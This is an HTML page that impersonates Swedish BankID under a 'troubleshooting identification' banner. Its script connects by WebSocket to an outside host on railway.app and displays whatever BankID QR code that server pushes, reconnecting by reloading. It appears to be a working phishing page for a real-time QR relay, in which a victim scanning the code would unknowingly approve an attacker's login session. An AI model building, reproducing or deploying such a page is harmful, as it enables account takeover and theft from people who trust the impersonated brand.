<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BankID Felsökning</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
        }

        .top-header {
            background-color: #00005e;
            color: white;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .header-logo {
            height: 30px;
            width: auto;
        }

        .header-text {
            font-size: 20px;
            font-weight: bold;
        }

        .subheader-banner {
            background-color: #f8f9fa;
            padding: 10px 20px;
            border-bottom: 1px solid #ddd;
        }

        .subheader-text {
            color: #00005e;
            font-size: 14px;
            font-weight: bold;
        }

        main {
            max-width: 1200px;
            margin: 20px auto;
            padding: 0 20px;
        }

        #qrDisplay {
            max-width: 300px;
            width: 100%;
            height: auto;
            margin: 20px auto;
            display: block;
        }

        #qrDisplay {
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            background-color: white;
            object-fit: contain;
        }

        .loading-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background-color: white;
            border: 1px solid #ddd;
            border-radius: 4px;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #00005e;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 12px;
        }

        .loading-text {
            color: #00005e;
            font-size: 14px;
            font-weight: bold;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media (min-width: 48em) {
            main {
                padding: 0 16px;
            }
        }
    </style>
</head>
<body>
    <div class="top-header">
        <img src="/placeholder/display1-faviicon.png" alt="BankID Logo" class="header-logo">
        <span class="header-text">BankID</span>
    </div>

    <div class="subheader-banner">
        <span class="subheader-text">FELSÖKNINGS IDENTIFIERING</span>
    </div>

    <main>
        <div class="loading-container">
            <div class="spinner"></div>
            <div class="loading-text">Väntar på QR-kod...</div>
        </div>
        <img id="qrDisplay" style="display: none;" alt="QR Code Display">
    </main>

    <script>
        const socket = new WebSocket('wss://web-production-c116.up.railway.app');
        const qrDisplay = document.getElementById('qrDisplay');
        const loadingContainer = document.querySelector('.loading-container');

        socket.onopen = () => {
            console.log('Connected to server');
        };

        socket.onmessage = (event) => {
            const data = JSON.parse(event.data);
            if (data.type === 'qr' && data.bank === 'BANKID') {
                qrDisplay.src = data.qrData;
                qrDisplay.style.display = 'block';
                loadingContainer.style.display = 'none';
            }
        };

        socket.onerror = (error) => {
            console.error('WebSocket error:', error);
        };

        socket.onclose = () => {
            console.log('Disconnected from server');
            setTimeout(() => {
                window.location.reload();
            }, 5000);
        };
    </script>
</body>
</html>
